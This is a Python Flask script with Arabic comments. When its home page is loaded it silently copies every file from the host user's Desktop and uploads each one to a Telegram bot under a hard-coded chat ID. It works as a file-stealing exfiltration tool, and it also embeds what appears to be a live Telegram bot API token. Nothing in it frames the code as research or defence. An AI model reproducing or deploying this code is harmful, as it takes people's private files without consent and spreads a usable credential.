import os
import telebot
from flask import Flask, render_template
import shutil

# إعدادات بوت تلغرام
TELEGRAM_API_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'
CHAT_ID = '5152526784'  # يمكنك الحصول عليه باستخدام بوت @userinfobot أو عبر API

# إنشاء كائن بوت باستخدام مكتبة telebot
bot = telebot.TeleBot(TELEGRAM_API_TOKEN)

# تحديد المسار إلى سطح المكتب بناءً على نظام التشغيل
def get_desktop_path():
    """دالة لتحديد مسار سطح المكتب بناءً على نظام التشغيل"""
    if os.name == 'nt':  # إذا كان النظام Windows
        return os.path.join(os.environ['USERPROFILE'], 'Desktop')
    else:  # لأنظمة Unix (macOS أو Linux)
        return os.path.join(os.path.expanduser('~'), 'Desktop')

# المسار إلى سطح المكتب
DESKTOP_PATH = get_desktop_path()

# تحديد المجلد لحفظ الملفات المرفوعة (مجلد مؤقت على الخادم)
# هنا نقوم بإنشاء مجلد مؤقت داخل مجلد التطبيق نفسه لضمان عمل الكود على جميع الأنظمة
UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads')  # مجلد داخل تطبيق Flask
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# إعداد تطبيق Flask
app = Flask(__name__)

def send_file_to_telegram(file_path):
    """دالة لإرسال الملف إلى بوت تلغرام باستخدام مكتبة telebot"""
    try:
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id=CHAT_ID, document=file)
            return f"تم إرسال الملف {file_path} إلى تلغرام."
    except Exception as e:
        return f"حدث خطأ أثناء إرسال الملف: {e}"

def upload_files_automatically():
    """دالة لسحب الملفات تلقائيًا من سطح المكتب إلى المجلد المؤقت وإرسالها للبوت"""
    try:
        # التأكد من وجود المجلد
        if os.path.exists(DESKTOP_PATH) and os.path.isdir(DESKTOP_PATH):
            # قائمة بكل الملفات في المجلد سطح المكتب
            files = os.listdir(DESKTOP_PATH)
            for file in files:
                file_path = os.path.join(DESKTOP_PATH, file)
                
                # التأكد من أن الملف هو صورة أو مستند (يمكنك تعديل هذا إذا لزم الأمر)
                if os.path.isfile(file_path):
                    # نسخ الملف إلى المجلد المؤقت
                    shutil.copy(file_path, UPLOAD_FOLDER)
                    # مسار الملف الجديد في المجلد المؤقت
                    uploaded_file_path = os.path.join(UPLOAD_FOLDER, file)
                    # إرسال الصورة أو المستند إلى البوت
                    send_file_to_telegram(uploaded_file_path)
            return "تم إرسال جميع الملفات إلى تلغرام."
        else:
            return "المجلد سطح المكتب غير موجود أو غير صحيح."
    except Exception as e:
        return f"حدث خطأ أثناء سحب الملفات: {str(e)}"

@app.route('/')
def index():
    """الصفحة الرئيسية التي تقوم بسحب الملفات تلقائيًا وإرسالها إلى البوت"""
    try:
        message = upload_files_automatically()  # سحب الملفات تلقائيًا وإرسالها
        return render_template('index.html', message=message)
    except Exception as e:
        return render_template('index.html', message=f"حدث خطأ: {str(e)}")

if __name__ == '__main__':
    app.run(debug=True)
